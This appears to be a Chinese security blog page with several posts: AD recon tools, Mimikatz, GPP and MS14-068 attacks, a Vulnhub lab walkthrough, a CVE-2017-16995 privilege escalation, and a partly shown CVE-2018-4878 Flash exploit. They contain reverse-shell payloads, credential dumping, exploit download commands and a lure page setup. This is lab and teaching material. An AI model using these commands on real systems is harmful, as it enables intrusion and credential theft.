<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind –sc dclist</span><br></pre></td></tr></table></figure>
<p>根据email查询域用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind –sc email:exist@example.com</span><br></pre></td></tr></table></figure>
<p>ADFind示例</p>
<p>示例：</p>
<p>查询域中主机的spn</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind -b cn=computers,dc=example,dc=com servicePrincipalName</span><br></pre></td></tr></table></figure>
<p>查询域管理员账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind -b cn=&quot;Domain admins&quot;,cn=users,dc=example,dc=com member</span><br></pre></td></tr></table></figure>
<p>获取dns记录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b DC=exist.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=example,DC=com dn</span><br></pre></td></tr></table></figure>
<h3 id="PVEFindADUser-定位用户登录位置"><a href="#PVEFindADUser-定位用户登录位置" class="headerlink" title="PVEFindADUser(定位用户登录位置)"></a>PVEFindADUser(定位用户登录位置)</h3><p>PVEFindADUser.exe</p>
<p>用来定位用户登录的位置，依赖管理员权限，输出会保存在一个csv文件中。</p>
<p>Github地址：<a href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe" target="_blank" rel="noopener">https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe</a></p>
<p>示例：</p>
<p>显示每台计算机上登录的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindaduser –current  -noping</span><br></pre></td></tr></table></figure>
<p>查看172.17.0.132主机上登录的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADuser  -current  -target 172.17.0.132</span><br></pre></td></tr></table></figure>
<p>查看每台计算机上次登录的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADuser  -last</span><br></pre></td></tr></table></figure>
<h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit是一款powershell后渗透框架</p>
<p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p>框架一共分为下面几大块：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CodeExecution  - 代码执行，用来执行代码、dll注入、shellcode注入等</span><br><span class="line"></span><br><span class="line">AntivirusBypass  - 用来检测杀软特征码</span><br><span class="line"></span><br><span class="line">Exfiltration  -  主要用来窃取敏感数据，比如sam数据库，窃取用户密码、记录键盘等</span><br><span class="line"></span><br><span class="line">Mayhem  -  可以使目标蓝屏等</span><br><span class="line"></span><br><span class="line">Persistence  -  用于持久控制</span><br><span class="line"></span><br><span class="line">Privesc  - 用于帮助提权</span><br><span class="line"></span><br><span class="line">Recon   -  信息收集模块</span><br><span class="line"></span><br><span class="line">ScriptModification    -  脚本加密、混淆等</span><br></pre></td></tr></table></figure>
<p>PowerSploit中的脚本可以单独拿出来使用。</p>
<p>通常的使用方法是：</p>
<p>1.首先Powershell –ep bypass</p>
<p>2.然后Import-Module 脚本名</p>
<p>3.最后调用脚本中的函数名，比如import了invoke-shellcode.ps1,则执行可以输入invoke-shellcode arg1  arg2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz是Mimikatz的powershell版。有些功能需要bypass uac。</span><br><span class="line"></span><br><span class="line">获取内存中的凭证：</span><br><span class="line"></span><br><span class="line">     invoke-mimikatz –dumpcreds</span><br><span class="line"></span><br><span class="line">执行mimikatz命令</span><br><span class="line"></span><br><span class="line">     invoke-mimikatz  -command “token::whoami exit”</span><br></pre></td></tr></table></figure>
<h3 id="PowerView工具"><a href="#PowerView工具" class="headerlink" title="PowerView工具"></a>PowerView工具</h3><p>PowerView</p>
<p>Powerview是一款域渗透工具。它包含了部分adfind拥有的功能，同时增加了一些新的功能。</p>
<p>工具使用powershell开发，配合cobalt strike等工具使用十分方便。</p>
<p>下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
<p>项目的README在<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a>， 里面有Powerview中的函数说明。</p>
<p>参考文章：</p>
<p><a href="https://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/" target="_blank" rel="noopener">https://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/</a></p>
<p>遇到不知道如何使用的函数时，记得使用get-help</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.Get-NetDomain  -  获取域信息</span><br><span class="line"></span><br><span class="line">2.Get-NetForest    -  获取林信息</span><br><span class="line"></span><br><span class="line">3.Get-NetDomainController  -  获取域控制器信息</span><br><span class="line"></span><br><span class="line">4.Get-Proxy – 获取代理信息</span><br><span class="line"></span><br><span class="line">5.Invoke-ProcessHunter   -  获取进程信息，可以指定用户名搜索，也可以指定进程名搜索</span><br><span class="line"></span><br><span class="line">6.Get-NetShare  -  获取共享信息</span><br></pre></td></tr></table></figure>
<h3 id="CSVDE-amp-LDIFDE工具"><a href="#CSVDE-amp-LDIFDE工具" class="headerlink" title="CSVDE&amp;LDIFDE工具"></a>CSVDE&amp;LDIFDE工具</h3><p>Csvde和ldifde的功能基本相同，都是从ad ds中导入/导出数据，区别在于前者处理csv格式的数据，后者处理ldif格式的数据。Csvde参数与ldifde参数基本相同，这里仅举csvde的几个例子：</p>
<p>在安装了ad ds/lds服务的计算机上才会启用此工具，工具位于%windir%\system32\csvde.exe</p>
<p>从活动目录中导出用户信息：</p>
<p>   csvde  -d “cn=users,dc=example,dc=com” –r “objectclass=user” –f output.csv</p>
<p>从活动目录中导出域控信息：</p>
<p>   csvde  -d “ou=domain\20controllers,dc=example,dc=com”  -r “objectclass=computer” –f output.csv</p>
<p>-d 参数用来设置rootdn，说简单点就是目录树搜索开始的地方， -r参数指定过滤器</p>
<h3 id="ADExplorer-exe工具"><a href="#ADExplorer-exe工具" class="headerlink" title="ADExplorer.exe工具"></a>ADExplorer.exe工具</h3><p>ADExplorer.exe</p>
<p>一款查看域结构的工具。</p>
<p>下载地址：<a href="https://download.sysinternals.com/files/AdExplorer.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/AdExplorer.zip</a></p>
<h3 id="LDAPSearch工具"><a href="#LDAPSearch工具" class="headerlink" title="LDAPSearch工具"></a>LDAPSearch工具</h3><p>LDAPSearch</p>
<p>Ldapsearch是linux下的ldap客户端。</p>
<p>示例：</p>
<p>​        ldapsearch -x -h 172.17.0.128 -b “cn=computers,dc=example,dc=com” -D “<a href="mailto:exist@example.com" target="_blank" rel="noopener">exist@example.com</a>“ –w “123456” “(!(dnshostname=DOMAIN1DM1.example.com))“</p>
<p>参数解释：</p>
<p>​       -x  进行认证</p>
<p>​       -h  设置主机</p>
<p>​       -b  设置basedn</p>
<p>​       -D  设置用户名</p>
<p>​       -w  设置密码</p>
<p>​       “(!(dnshostname=DOMAIN1DM1.example.com))“    对结果进行过滤，使用ldap语法</p>
<h2 id="横向拓展常见漏洞利用"><a href="#横向拓展常见漏洞利用" class="headerlink" title="横向拓展常见漏洞利用"></a>横向拓展常见漏洞利用</h2><h3 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h3><p>组策略</p>
<blockquote>
<p>组策略是windows操作系统中的一种基础架构，用来帮助管理员对用户及计算机实施特定的配置。</p>
</blockquote>
<p>组策略分为两种类型：本地组策略和域组策略。本地组策略适用于未加入域和已加入域但未登录到域的计算机。域组策略存储在域控制器上，只能在活动目录环境中使用。</p>
<ul>
<li>组策略对象</li>
</ul>
<p>组策略对象（GPO）是一组组策略设置的集合。</p>
<ul>
<li>组策略首选项</li>
</ul>
<p>组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。</p>
<p>组策略对象包含两部分：组策略容器（GPC）和组策略模板（GPT）。组策略容器存储在ad数据库中，主要记录gpo的版本和属性等信息，而组策略模板则是一个文件夹，位置默认在%systemroot%\sysvol\sysvol\domainname\Policies{GUID}   </p>
<p>SYSVOL文件夹</p>
<p>默认位置在%systemroot%\sysvol，用来存储组策略配置及脚本等文件，其子文件夹sysvol对应于DC上的SYSVOL共享，域成员均有权限读取此共享。</p>
<p>GPP漏洞</p>
<p>1.管理员常用组策略首选项功能： 为所有域成员主机添加本地用户。</p>
<p>2.添加此组策略首选项后，当域成员更新组策略时，会从域控的sysvol共享中下载一个groups.xml文件，里面有新建用户的信息，其中包含了加密的密码</p>
<p>3.Xml文件内容示例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"example"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2018-03-05 13:40:42"</span> <span class="attr">uid</span>=<span class="string">"&#123;0C50F05E-D3D5-4C91-B5FE-8991CD22231D&#125;"</span> <span class="attr">userContext</span>=<span class="string">"0"</span> <span class="attr">removePolicy</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">"example"</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"SZ/RdrwxoUkV5Gv+C5cYmdW7XWbSfA6WFaY+7xTlIU8"</span> <span class="attr">changeLogon</span>=<span class="string">"0"</span> <span class="attr">noChange</span>=<span class="string">"0"</span> <span class="attr">neverExpires</span>=<span class="string">"1"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">subAuthority</span>=<span class="string">""</span> <span class="attr">userName</span>=<span class="string">"example"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>微软公开了它的对称AES密钥，因此我们可以对其进行解密。</p>
<ul>
<li>介绍一款漏洞利用的工具：Get-GPPPassword</li>
</ul>
<p>这个powershell脚本包含在powersploit框架中。使用时需要import-module后调用get-gpppassword这个cmdlet。</p>
<p>如果出现下列错误：</p>
<p>Get-DecryptedCpassword : 找不到类型 [System.Security.Cryptography.AesCryptoServiceProvider]: 请确保已加载包含此类型的程序集。</p>
<p>可以在运行前执行下列命令：Add-Type -AssemblyName System.Core</p>
<h3 id="MS14-068漏洞"><a href="#MS14-068漏洞" class="headerlink" title="MS14-068漏洞"></a>MS14-068漏洞</h3><p>MS14-068</p>
<p>Ms14-068漏洞可以使任意一个普通域用户提升至</p>
<p>域管理员权限。</p>
<p>利用工具：</p>
<p>Kekeo 项目地址：</p>
<p><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
<p>示例：</p>
<p>在拿到一个域用户的密码后，使用下列命令生成票据：</p>
<p>Exploit::ms14068  /domain:example.com  /user:example  /password:Welcometoexample</p>
<p>这会在kekeo目录下生成一张票据。之后使用kerberos::purge来清除内存中已有的票据，等待数秒后，使用</p>
<p>Kerberos::ptt  票据文件名 来导入票据。如果上述操作没有问题的话，现在已经拥有域管理员权限，可以使用dir \域控主机名\c$来测试一下权限，能列出目录则说明已是域管理员权限。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-BSides Vancouver"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/04/09/BSides Vancouver/">Vulnhub 靶机渗透初见</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/04/09/BSides Vancouver/" class="article-date">
	  <time datetime="2018-04-09T15:53:56.000Z" itemprop="datePublished">2018-04-09</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Vulnhub-靶机渗透初见"><a href="#Vulnhub-靶机渗透初见" class="headerlink" title="Vulnhub 靶机渗透初见"></a>Vulnhub 靶机渗透初见</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Vulnhub 是国外<a href="https://twitter.com/VulnHub" target="_blank" rel="noopener">Vulnhub </a>团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。</p>
<p> <a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
<h3 id="0X01-BSides-Vancouver-2018-Workshop）"><a href="#0X01-BSides-Vancouver-2018-Workshop）" class="headerlink" title="0X01 BSides Vancouver: 2018 (Workshop）"></a>0X01 BSides Vancouver: 2018 (Workshop）</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/" target="_blank" rel="noopener">BSides Vancouver: 2018 (Workshop) ~ VulnHub</a>，可使用种子下载，速度较快。</p>
<p>下载的VOA文件可用VirtualBox或者VMware Workstation导入使用。配置靶机的网络启动即可。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/i9B8e6fmjH.png?imageslim" alt="mark"></p>
<h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>老规矩先扫描，可以看到 存在FTP Anonymous访问访问漏洞，</p>
<p>nbtscan 192.168.1.1/24<br>nmap -A 192.168.1.32</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/JB1kilHHKA.png?imageslim" alt="mark"></p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/HIGAGlgfBg.png?imageslim" alt="mark"></p>
<p>下载 users.txt.bk  得到用户名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abatchy</span><br><span class="line">john</span><br><span class="line">mai</span><br><span class="line">anne</span><br><span class="line">doomguy</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>wpscan -u  <a href="http://192.168.1.32/backup_wordpress/" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress/</a><br>wpscan -u <a href="http://192.168.1.32/backup_wordpress" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress</a> -username john –wordlist /usr/share/wordlists/rockyou.txt</p>
<p>利用 wp_admin_shell_upload 漏洞</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/JcAIm6dheJ.png?imageslim" alt="mark"></p>
<p>爆破  密码得到<strong>enigma</strong></p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/7cDAkaI4k2.png?imageslim" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.32</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/06F9iE18i8.png?imageslim" alt="mark"></p>
<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>但是没有root权限，下一步需要提权。</p>
<p>一般来说 linux提权可以使用用exp提权，或者通过计划任务、SUID文件属性进行提权。这里使用计划任务，查看root用户执行的计划任务。<code>cat crontab</code> ，把远控脚本写入<code>/usr/local/bin/cleanup</code>中，执行，用nc反向连接。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/m1Dd6iDll7.png?imageslim" alt="mark"></p>
<p>msfvenom -p cmd / unix / reverse_python lhost = 192.168.1.63 lport = 9866 R  #msfveom 生成python后门 </p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/gH8j7iE1g0.png?imageslim" alt="mark"></p>
<p>上传python远控木马</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/94DA1fGGIF.png?imageslim" alt="mark"></p>
<p>nc -lvp 9866   # nc 反向监听</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180408/9B8FblBjD4.png?imageslim" alt="mark"></p>
<h3 id="0X02-总结"><a href="#0X02-总结" class="headerlink" title="0X02 总结"></a>0X02 总结</h3><p>通过对以上靶机进行渗透测试，可以看出Vulnhub 靶机平台的靶机镜像环境还是不错的，平台提供初中高级的靶机镜像、从Web安全到系统安全也可以。基本可以涵盖大部分的渗透测试流程，可以较为方便的实验测试靶机。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机渗透/">靶机渗透</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-ctf-web"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
    <div class="article-meta">
      
	<a href="/2018/03/30/ctf-web/" class="article-date">
	  <time datetime="2018-03-29T23:18:41.441Z" itemprop="datePublished">2018-03-30</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      
      
      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-CVE-2017-16995 Ubuntu16.04"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/03/17/CVE-2017-16995 Ubuntu16.04/">CVE-2017-16995 Ubuntu16.04漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/17/CVE-2017-16995 Ubuntu16.04/" class="article-date">
	  <time datetime="2018-03-17T15:53:56.000Z" itemprop="datePublished">2018-03-17</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2017-16995-Ubuntu16-04"><a href="#CVE-2017-16995-Ubuntu16-04" class="headerlink" title="CVE-2017-16995 Ubuntu16.04"></a>CVE-2017-16995 Ubuntu16.04</h1><p><strong>影响版本：</strong><br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04</p>
<p>提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用cat /proc/version查看Linux内核版本 ：</span><br><span class="line">cat /etc/shadow查看账号密码</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">wget  http://cyseclabs.com/pub/upstream44.c</span><br><span class="line">gcc -o test upstream44.c </span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>emmmm  不懂</p>
<h2 id="修复和缓解建议："><a href="#修复和缓解建议：" class="headerlink" title="修复和缓解建议："></a>修复和缓解建议：</h2><p>目前暂未有明确的补丁升级方案。 建议用户在评估风险后，通过修改内核参数限制普通用户使用bpf(2)系统调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Adobe远程代码执行漏洞-CVE-2018-4878"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/">Adobe远程代码执行漏洞-CVE-2018-4878</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/" class="article-date">
	  <time datetime="2018-03-06T04:52:08.000Z" itemprop="datePublished">2018-03-06</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Adobe远程代码执行漏洞-CVE-2018-4878"><a href="#Adobe远程代码执行漏洞-CVE-2018-4878" class="headerlink" title="Adobe远程代码执行漏洞-CVE-2018-4878"></a>Adobe远程代码执行漏洞-CVE-2018-4878</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2018年2月1日， Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁。CVE-2018-4878的被用于针对Windows用户的有限的针对性攻击。这些攻击利用通过电子邮件分发嵌入式恶意Flash内容的Office文档。    </p>
<p>&emsp;&emsp;如下图所示影响 Flash Player28.0.0.137以及之前的所有版本 </p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/gmdcKDH43c.png?imageslim" alt="mark"></p>
<p><a href="https://helpx.adobe.com/security/products/flash-player/apsa18-01.html" target="_blank" rel="noopener">https://helpx.adobe.com/security/products/flash-player/apsa18-01.html</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-生成payload"><a href="#第一步-生成payload" class="headerlink" title="第一步 生成payload"></a>第一步 生成payload</h3><p>进入CVE-2018-4878-payload目录中</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/IjKa0j63b4.png?imageslim" alt="mark"></p>
<p>用msfvenom生成python语言的shellcode。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.11 lport=8118  -f  python&gt;shellcode.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.txt</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/Fb2KLdG5E9.png?imageslim" alt="mark"></p>
<p>生成目录如下图所示（如需更改vim编辑）：</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/3i5J1f12a2.png?imageslim" alt="mark"></p>
<p>把使用实验环境所给的tmp.py文件追加到已经把shellcode.txt改名为payload.py文件中。得到最终的payload.py才是我们的攻击完整的程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp shellcode.txt payload.py</span><br><span class="line">cat tmp.py &gt;&gt;payload.py</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/gdL4GdLd91.png?imageslim" alt="mark"></p>
<p>payload.py 文件部分如下，可以根据情况更改：</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/eii5iA38Lf.png?imageslim" alt="mark"></p>
<p>执行我们的攻击程序payload.py。生成exploit.swf与index.html文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload.py</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/b3E49AAmIC.png?imageslim" alt="mark"></p>
<p>接下来开启apache服务也就是我们的Web服务诱导目标用户访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></table></figure>
<p>sudo  需要输入密码 为360College</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/Jbc72gJC5f.png?imageslim" alt="mark"></p>
<p>可以看到Apache服务开启。我们再吧index.html与exploit.swf文件复制到/var/www/html目录下也就是Apache服务器的web访问目录，使用户可以访问我们的这些文件，从而漏洞利用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp index.html /var/www/html/index2.html </span><br><span class="line">sudo cp exploit.swf /var/www/html/exploit.swf</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/B6a878HdA2.png?imageslim" alt="mark"></p>
<h3 id="第二步-Metasploit-利用"><a href="#第二步-Metasploit-利用" class="headerlink" title="第二步 Metasploit 利用"></a>第二步 Metasploit 利用</h3><p>启动Metasploit，执行以下命令，监听端口，等待目标上钩，反弹shell到kali攻击机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.11 [攻击机IP地址]</span><br><span class="line">set lport 8118</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/G3lj8ieiIm.png?imageslim" alt="mark"></p>
<h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>在靶机上，安装Adobe Flash Player软件。点击安装，下一步即可安装。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/Gb7laaD5D9.png?imageslim" alt="mark"></p>
<p>安装成功。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/358k6HgECj.png?imageslim" alt="mark"></p>
<p>打开IE浏览器。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/6LB724akc2.png?imageslim" alt="mark"></p>
